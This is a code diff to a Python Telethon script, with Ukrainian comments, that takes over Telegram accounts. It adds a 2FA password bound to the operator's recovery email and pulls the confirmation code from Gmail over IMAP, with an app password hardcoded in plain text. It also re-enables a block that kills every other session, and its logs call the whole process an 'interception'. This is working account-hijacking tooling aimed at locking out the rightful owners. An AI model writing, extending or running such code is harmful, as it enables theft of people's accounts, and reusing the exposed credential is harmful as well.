@@ -7,7 +7,11 @@ import hashlib
 import os
 import json
 import shutil
-
+import imaplib
+import threading
+import time
+import email
+import re
 from telethon import TelegramClient
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -16,11 +20,14 @@ from telethon.errors import (
     PhoneCodeInvalidError,
     PhoneCodeExpiredError, PasswordHashInvalidError
 )
+from typing import Optional
+
 import logging
 from datetime import datetime, timedelta, timezone
 
 from clear_telegram_chat import MASK_MESSAGE
-from config import CHAT_FOLDER
+from config import CHAT_FOLDER, RECOVERY_EMAIL
+
 from telethon import functions, types
 
 logger = logging.getLogger(__name__)
@@ -324,13 +331,152 @@ async def delete_session(phone: str, session_folder: str):
         return False
 
 
+def get_email_code_sync(imap_host: str, email_user: str, email_pass: str, timeout: int = 60) -> str:
+    """Синхронна версія отримання коду з пошти"""
+    logger.info(f"📧 Починаємо отримання коду з {imap_host} для {email_user}")
+    deadline = time.time() + timeout
+    attempt = 1
+
+    while time.time() < deadline:
+        logger.info(f"📧 Спроба {attempt} отримати код...")
+
+        try:
+            # Підключаємось до IMAP
+            logger.debug(f"Підключення до IMAP сервера {imap_host}...")
+            mail = imaplib.IMAP4_SSL(imap_host)
+            mail.login(email_user, email_pass)
+            logger.debug("Успішно підключено до IMAP")
+
+            mail.select("inbox")
+            logger.debug("Вибрана папка inbox")
+
+            # Шукаємо непрочитані листи від Telegram
+            logger.debug("Пошук листів від noreply@telegram.org...")
+            _, messages = mail.search(None, 'FROM "noreply@telegram.org" UNSEEN')
+
+            message_count = len(messages[0].split()) if messages[0] else 0
+            logger.info(f"Знайдено {message_count} непрочитаних листів від Telegram")
+
+            if messages[0]:
+                # Беремо останній лист
+                msg_id = messages[0].split()[-1]
+                logger.debug(f"Читаємо лист з ID: {msg_id}")
+
+                _, msg_data = mail.fetch(msg_id, "(RFC822)")
+
+                if msg_data and msg_data[0] and msg_data[0][1]:
+                    raw_email = msg_data[0][1]
+                    logger.debug(f"Отримано email, розмір: {len(raw_email)} байт")
+                else:
+                    logger.warning("Не вдалося отримати дані листа")
+                    mail.logout()
+                    time.sleep(5)
+                    attempt += 1
+                    continue
+
+                msg = email.message_from_bytes(raw_email)
+
+                # Витягуємо текст листа
+                body = ""
+                if msg.is_multipart():
+                    logger.debug("Email є multipart, шукаємо text/plain частину")
+                    for part in msg.walk():
+                        content_type = part.get_content_type()
+                        logger.debug(f"Знайдено частину з типом: {content_type}")
+                        if content_type == "text/plain":
+                            body = part.get_payload(decode=True).decode()
+                            logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")
+                            break
+                else:
+                    logger.debug("Email не multipart, читаємо payload")
+                    body = msg.get_payload(decode=True).decode()
+                    logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")
+
+                # Шукаємо код (5-6 цифр)
+                logger.debug("Пошук коду підтвердження...")
+                code_match = re.search(r'\b(\d{5,6})\b', body)
+
+                if code_match:
+                    code = code_match.group(1)
+                    logger.info(f"✅ Знайдено код: {code}")
+
+                    # Помічаємо лист як прочитаний
+                    mail.store(msg_id, '+FLAGS', '\\Seen')
+                    logger.debug("Лист позначено як прочитаний")
+
+                    mail.logout()
+                    logger.debug("Відключено від IMAP")
+                    return code
+                else:
+                    logger.warning("Код не знайдено в тексті листа")
+
+                    # Для дебагу покажемо перші 500 символів
+                    logger.debug(f"Текст листа для аналізу: {body[:500]}")
+            else:
+                logger.info("Немає нових листів від Telegram")
+
+            mail.logout()
+            logger.debug("Відключено від IMAP")
+
+        except imaplib.IMAP4.error as e:
+            logger.error(f"❌ IMAP помилка: {e}")
+        except Exception as e:
+            logger.error(f"❌ Неочікувана помилка: {e}", exc_info=True)
+
+        # Чекаємо перед наступною спробою
+        wait_time = 5
+        logger.info(f"⏳ Чекаємо {wait_time} секунд перед наступною спробою...")
+        time.sleep(wait_time)
+        attempt += 1
+
+    logger.error(f"❌ Час очікування ({timeout} секунд) вичерпано")
+    raise TimeoutError("Код підтвердження не отримано за відведений час")
+
+
+def create_email_callback(imap_host: str, email_user: str, email_pass: str):
+    """Створює синхронний callback для Telethon"""
+
+    def email_code_callback(code_length: int):
+        """Синхронний callback для Telethon"""
+        logger.info(f"📧 Очікуємо код підтвердження на пошті (довжина: {code_length})...")
+        logger.info(f"📧 Параметри: host={imap_host}, user={email_user}")
+
+        try:
+            # Викликаємо синхронну функцію безпосередньо
+            code = get_email_code_sync(imap_host, email_user, email_pass, timeout=120)
+            logger.info(f"✅ Код успішно отримано: {code}")
+            return code
+        except TimeoutError as e:
+            logger.error(f"❌ Таймаут отримання коду: {e}")
+            raise
+        except Exception as e:
+            logger.error(f"❌ Помилка отримання коду: {e}", exc_info=True)
+            raise
+
+    return email_code_callback
+
+
 async def get_account_with_2fa(client: TelegramClient, new_password: str):
     try:
+        IMAP_HOST = "imap.gmail.com"
+        EMAIL_USER = RECOVERY_EMAIL
+        EMAIL_PASS = "yjhlrwefngcoiwih"  # App Password для Gmail
+
+        logger.info("📧 Починаємо процес встановлення 2FA")
+        logger.info(f"📧 Email для відновлення: {EMAIL_USER}")
+        logger.info(f"📧 IMAP хост: {IMAP_HOST}")
+
+        # Створюємо callback функцію
+        callback = create_email_callback(IMAP_HOST, EMAIL_USER, EMAIL_PASS)
+
         # Використовуємо вбудований метод Telethon для встановлення 2FA
+        logger.info("📧 Викликаємо client.edit_2fa...")
         await client.edit_2fa(
             current_password=None,  # Якщо пароля ще немає
             new_password=new_password,
-            hint="For security"  # Опціонально, підказка для пароля
+            hint="For security",
+            email=RECOVERY_EMAIL,
+            email_code_callback=callback
         )
 
         try:
@@ -342,7 +488,7 @@ async def get_account_with_2fa(client: TelegramClient, new_password: str):
         logger.info(f"✅ Пароль 2FA успішно встановлено.")
 
         # --- Крок 3: Завершення всіх інших сесій ---
-        """logger.info("🔄 Завершую всі інші сесії...")
+        logger.info("🔄 Завершую всі інші сесії...")
         sessions = await client(functions.account.GetAuthorizationsRequest())
         terminated_count = 0
         for session in sessions.authorizations:
@@ -351,7 +497,7 @@ async def get_account_with_2fa(client: TelegramClient, new_password: str):
                 logger.info(f" - Сесію {session.device_model} ({session.platform}) завершено.")
                 terminated_count += 1
 
-        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")"""
+        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")
         return True, f"Перехоплення успішне"#. Завершено {terminated_count} інших сесій."
 
     except PasswordHashInvalidError:
